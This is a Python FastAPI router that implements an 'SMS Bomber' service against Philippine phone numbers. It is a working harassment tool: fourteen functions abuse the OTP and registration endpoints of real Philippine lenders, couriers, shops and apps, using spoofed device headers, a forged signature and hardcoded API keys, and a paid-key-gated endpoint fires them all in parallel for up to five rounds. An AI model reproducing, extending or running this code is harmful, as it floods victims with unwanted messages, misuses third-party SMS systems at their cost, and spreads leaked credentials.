"""
routers/sms.py — SMS Bomber API endpoint
All 12 services ported directly from the Xissin Telegram bot (main.py)
Philippine numbers only: 9XXXXXXXXX format
"""

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Optional
import requests
import random
import string
import hashlib
import time
import re
import uuid as uuid_lib
from concurrent.futures import ThreadPoolExecutor, as_completed

import database as db

router = APIRouter()

# ── Request / Response Models ─────────────────────────────────────────────────

class BombRequest(BaseModel):
    phone: str
    user_id: str
    rounds: int = 1   # 1–5 rounds

class BombResponse(BaseModel):
    success: bool
    phone: str
    rounds: int
    results: list
    total_sent: int
    total_failed: int

# ── Helpers ───────────────────────────────────────────────────────────────────

def _format_phone(phone: str) -> str:
    p = re.sub(r"[\s\-\+]", "", phone)
    if p.startswith("0"):
        p = p[1:]
    elif p.startswith("63"):
        p = p[2:]
    return p

def _validate_phone(phone: str) -> bool:
    return bool(re.match(r"^9\d{9}$", _format_phone(phone)))

def _rstr(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _gmail() -> str:
    n = random.randint(8, 12)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n)) + "@gmail.com"

# ── Individual service senders ────────────────────────────────────────────────

def _send_bomb_otp(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent":     "OSIM/1.55.0 (Android 13; CPH2465; OP5958L1; arm64-v8a)",
            "Accept":         "application/json",
            "Accept-Encoding":"gzip",
            "Content-Type":   "application/json; charset=utf-8",
            "accept-language":"en-SG",
            "region":         "PH",
        }
        data = {"userName": p, "phoneCode": "63", "password": f"TempPass{random.randint(1000,9999)}!"}
        r = requests.post("https://prod.services.osim-cloud.com/identity/api/v1.0/account/register",
                          headers=headers, json=data, timeout=10)
        if r.status_code in (200, 201):
            try:
                rj = r.json()
                rc = rj.get("resultCode", 0)
                if rc in [200000, 201000, 200, 201, 0] or r.status_code == 200:
                    return True, "OTP triggered"
                return False, rj.get("message", f"Code {rc}")
            except Exception:
                return True, "OTP triggered"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_ezloan(phone: str):
    try:
        p  = _format_phone(phone)
        ts = int(time.time() * 1000)
        headers = {
            "User-Agent": "okhttp/4.9.2",
            "Accept":     "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
            "accept-language": "en",
            "imei":        "7a997625bd704baebae5643a3289eb33",
            "device":      "android",
            "source":      "EZLOAN",
            "businessid":  "EZLOAN",
            "appid":       "EZLOAN",
            "blackbox":    f"kGPGg{ts}DCl3O8MVBR0",
        }
        data = {"businessId": "EZLOAN", "contactNumber": f"+63{p}",
                "appsflyerIdentifier": f"{ts}-{random.randint(10**18, 10**19-1)}"}
        r = requests.post("https://gateway.ezloancash.ph/security/auth/otp/request",
                          headers=headers, json=data, timeout=12)
        if r.status_code in (200, 201):
            try:
                rj = r.json()
                if rj.get("code") == 0 or rj.get("success") in (True, 1):
                    return True, "OTP sent"
                if rj.get("code") in (200, 201):
                    return True, "OTP sent"
                return False, rj.get("msg") or rj.get("message") or f"Code {rj.get('code')}"
            except Exception:
                return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_xpress(phone: str):
    try:
        p  = _format_phone(phone)
        ts = int(time.time())
        pwd = f"Pass{random.randint(1000,9999)}!Xp"
        headers = {
            "User-Agent":   "Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)",
            "Content-Type": "application/json",
            "Accept":       "application/json",
            "Accept-Language": "en-PH",
        }
        data = {
            "FirstName": f"User{ts % 10000}", "LastName": f"PH{random.randint(1000,9999)}",
            "Email": _gmail(), "Phone": f"+63{p}", "Password": pwd, "ConfirmPassword": pwd
        }
        r = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                          headers=headers, json=data, timeout=10)
        if r.status_code in (200, 201):
            return True, "OTP sent to phone"
        try:
            rj = r.json()
            return False, rj.get("message") or rj.get("error") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_excellent_lending(phone: str):
    try:
        p = _format_phone(phone)
        headers = {"User-Agent": "okhttp/4.12.0", "Content-Type": "application/json; charset=utf-8",
                   "Accept": "application/json", "Accept-Encoding": "gzip"}
        for fmt in (p, f"+63{p}", f"0{p}"):
            try:
                data = {"domain": fmt, "cat": "login", "previous": False, "financial": _rstr(32)}
                r = requests.post("https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
                                  headers=headers, json=data, timeout=10)
                if r.status_code in (200, 201):
                    try:
                        rj = r.json()
                        if rj.get("code") in (0, 200, 201) or rj.get("success") in (True, 1):
                            return True, rj.get("message") or "OTP triggered"
                    except Exception:
                        return True, "OTP triggered"
                if r.status_code in (400, 404, 422):
                    continue
                break
            except Exception:
                continue
        return False, "All formats failed"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_bistro(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 16; CPH2465) AppleWebKit/537.36",
            "Accept":     "application/json, text/plain, */*",
            "origin":     "http://localhost",
            "x-requested-with": "com.allcardtech.bistro",
        }
        r = requests.get(f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{p}",
                         headers=headers, timeout=10)
        if r.status_code == 200:
            rj = r.json()
            if rj.get("isSuccessful"):
                return True, rj.get("message", "OTP sent")
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_bayad(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent":     "okhttp/4.12.0",
            "Accept-Encoding":"gzip",
            "Content-Type":   "application/json",
            "x-api-key":      "b28e7266-75ff-4eab-8cc1-d6e52e2e9dba",
        }
        data = {"mobile": f"0{p}", "context": "register"}
        r = requests.post("https://api.bayadcenter.com/v1/auth/otp", headers=headers, json=data, timeout=10)
        if r.status_code in (200, 201):
            return True, "OTP sent"
        try:
            rj = r.json()
            return False, rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_lbc(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent": "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }
        data = {"mobile_number": f"+63{p}", "type": "registration"}
        r = requests.post("https://api.lbcexpress.com/v1/otp/send", headers=headers, json=data, timeout=10)
        if r.status_code in (200, 201):
            return True, "OTP sent"
        try:
            rj = r.json()
            return False, rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_pickup_coffee(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent": "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }
        data = {"phone": f"+63{p}", "type": "register"}
        r = requests.post("https://api.pickupcoffee.com/v1/auth/otp", headers=headers, json=data, timeout=10)
        if r.status_code in (200, 201):
            return True, "OTP sent"
        try:
            rj = r.json()
            return False, rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_honey_loan(phone: str):
    try:
        p = _format_phone(phone)
        base_headers = {
            "User-Agent":    "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type":  "application/json",
        }
        for url, ph in [
            ("https://api.honeyloan.ph/api/client/registration/step-one", f"+63{p}"),
            ("https://api.honeyloan.ph/api/v2/client/registration/send-otp", f"0{p}"),
        ]:
            try:
                body = {"phone": ph, "mobile_number": ph, "phone_number": ph, "is_rights_block_accepted": True}
                r = requests.post(url, headers=base_headers, json=body, timeout=12)
                if r.status_code in (200, 201):
                    try:
                        rj = r.json()
                        msg = rj.get("message") or rj.get("msg") or "OTP sent"
                        return True, msg
                    except Exception:
                        return True, "OTP sent"
                if r.status_code in (400, 404, 422):
                    continue
                break
            except Exception:
                continue
        return False, "All endpoints failed"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_kumu(phone: str):
    try:
        p  = _format_phone(phone)
        ts = int(time.time())
        rs = _rstr(32)
        sig_raw = f"{ts}{rs}{p}kumu_secret_2024"
        sig = hashlib.sha256(sig_raw.encode()).hexdigest()
        headers = {
            "User-Agent":   "okhttp/5.0.0-alpha.14",
            "Content-Type": "application/json;charset=UTF-8",
            "Device-Type":  "android",
            "Device-Id":    "07b76e92c40b536a",
            "Version-Code": "1669",
            "X-kumu-Token": "",
        }
        data = {"country_code": "+63", "cellphone": p,
                "encrypt_rnd_string": rs, "encrypt_signature": sig, "encrypt_timestamp": ts}
        r = requests.post("https://api.kumuapi.com/v2/user/sendverifysms", headers=headers, json=data, timeout=10)
        if r.status_code == 200:
            rj = r.json()
            if rj.get("code") in [200, 403]:
                return True, rj.get("message", "OTP sent")
            return False, f"API Error: {rj.get('message','Unknown')}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_s5(phone: str):
    try:
        p = f"+63{_format_phone(phone)}"
        headers = {"accept": "application/json, text/plain, */*",
                   "user-agent": "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36"}
        r = requests.post("https://api.s5.com/player/api/v1/otp/request",
                          headers=headers, files={"phone_number": (None, p)}, timeout=10)
        if r.status_code == 200:
            return True, "OTP request sent"
        try:
            rj = r.json()
            return False, rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_cashalo(phone: str):
    try:
        p = _format_phone(phone)
        dev_id = str(uuid_lib.uuid4())[:16].replace("-", "")
        af_id  = f"{int(time.time()*1000)}-{str(uuid_lib.uuid4().int)[:15]}"
        adv_id = str(uuid_lib.uuid4())
        fb_id  = uuid_lib.uuid4().hex
        headers = {
            "User-Agent":      "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json",
            "x-api-key":       "UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==",
            "x-device-identifier": dev_id,
            "x-device-type":   "1",
            "x-firebase-instance-id": fb_id,
        }
        data = {"phone_number": p, "device_identifier": dev_id, "device_type": 1,
                "apps_flyer_device_id": af_id, "advertising_id": adv_id}
        r = requests.post("https://api.cashaloapp.com/access/register", headers=headers, json=data, timeout=10)
        if r.status_code in (200, 201):
            try:
                rd = r.json()
                if "access_challenge_request" in rd:
                    return True, "OTP challenge sent"
                return True, rd.get("message") or "OTP sent"
            except Exception:
                return True, "OTP sent"
        try:
            rd = r.json()
            return False, rd.get("message") or rd.get("error") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_mwell(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent":    "okhttp/4.11.0",
            "Accept-Encoding": "gzip",
            "Content-Type":  "application/json; charset=utf-8",
            "ocp-apim-subscription-key": "0a57846786b34b0a89328c39f584892b",
            "x-app-version": random.choice(["03.942.035", "03.942.036"]),
            "x-device-type": "android",
            "x-timestamp":   str(int(time.time() * 1000)),
            "x-request-id":  _rstr(16),
        }
        data = {"country": "PH", "phoneNumber": p, "phoneNumberPrefix": "+63"}
        r = requests.post("https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
                          headers=headers, json=data, timeout=20)
        if r.status_code == 200:
            rj = r.json()
            if rj.get("c") == 200:
                return True, "OTP sent successfully"
            return False, f"API Error: Code {rj.get('c')}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


def _send_pexx(phone: str):
    try:
        p = _format_phone(phone)
        headers = {
            "User-Agent":    "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type":  "application/json",
            "x-msession-id": "undefined",
            "tid":           _rstr(11),
            "appversion":    "3.0.14",
        }
        data = {"0": {"json": {"email": "", "areaCode": "+63", "phone": f"+63{p}",
                                "otpChannel": "TG", "otpUsage": "REGISTRATION"}}}
        r = requests.post("https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
                          headers=headers, json=data, timeout=20)
        if r.status_code == 200:
            try:
                rj = r.json()
                if isinstance(rj, list) and rj:
                    result = rj[0].get("result", {}).get("data", {}).get("json", {})
                    if result.get("code") == 200:
                        return True, "OTP sent"
                    return False, result.get("msg", "Unknown error")
            except Exception:
                return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)[:50]}"


# ── Service registry ──────────────────────────────────────────────────────────

_SERVICES = [
    ("BOMB OTP",          _send_bomb_otp),
    ("EZLOAN",            _send_ezloan),
    ("XPRESS PH",         _send_xpress),
    ("EXCELLENT LENDING", _send_excellent_lending),
    ("BISTRO",            _send_bistro),
    ("BAYAD CENTER",      _send_bayad),
    ("LBC CONNECT",       _send_lbc),
    ("PICKUP COFFEE",     _send_pickup_coffee),
    ("HONEY LOAN",        _send_honey_loan),
    ("KUMU PH",           _send_kumu),
    ("S5.COM",            _send_s5),
    ("CASHALO",           _send_cashalo),
    ("MWELL",             _send_mwell),
    ("PEXX",              _send_pexx),
]

# ── Endpoint ──────────────────────────────────────────────────────────────────

@router.get("/services")
def list_services():
    """List all available SMS bomber services."""
    return {"services": [name for name, _ in _SERVICES], "total": len(_SERVICES)}


@router.post("/bomb", response_model=BombResponse)
def bomb(req: BombRequest):
    """
    Fire the SMS bomber.
    - Requires user to be registered and not banned.
    - Validates PH phone number format.
    - Runs all services in parallel per round.
    """
    # Auth checks
    if db.is_banned(req.user_id):
        raise HTTPException(status_code=403, detail="You are banned.")
    user = db.get_user(req.user_id)
    if not user:
        raise HTTPException(status_code=403, detail="User not registered.")
    if user.get("active_key"):
        from datetime import datetime
        from zoneinfo import ZoneInfo
        expires = datetime.fromisoformat(user["key_expires"])
        now = datetime.now(ZoneInfo("Asia/Manila")).replace(tzinfo=None)
        if now > expires:
            raise HTTPException(status_code=403, detail="Your key has expired. Please redeem a new one.")
    else:
        raise HTTPException(status_code=403, detail="No active key. Please redeem a key first.")

    # Phone validation
    if not _validate_phone(req.phone):
        raise HTTPException(status_code=400, detail="Invalid PH phone number. Use format: 9XXXXXXXXX")

    rounds = max(1, min(req.rounds, 5))
    all_results = []
    total_sent   = 0
    total_failed = 0

    for round_num in range(1, rounds + 1):
        with ThreadPoolExecutor(max_workers=len(_SERVICES)) as executor:
            futures = {executor.submit(fn, req.phone): name for name, fn in _SERVICES}
            for future in as_completed(futures, timeout=30):
                name = futures[future]
                try:
                    success, msg = future.result(timeout=5)
                except Exception as e:
                    success, msg = False, str(e)[:50]

                all_results.append({
                    "round":   round_num,
                    "service": name,
                    "success": success,
                    "message": msg,
                })
                if success:
                    total_sent += 1
                else:
                    total_failed += 1

    # Log stat
    db.increment_sms_stat(req.user_id, total_sent)
    db.append_log({
        "action":       "sms_bomb",
        "user_id":      req.user_id,
        "phone":        req.phone,
        "rounds":       rounds,
        "total_sent":   total_sent,
        "total_failed": total_failed,
    })

    return BombResponse(
        success=total_sent > 0,
        phone=req.phone,
        rounds=rounds,
        results=all_results,
        total_sent=total_sent,
        total_failed=total_failed,
    )
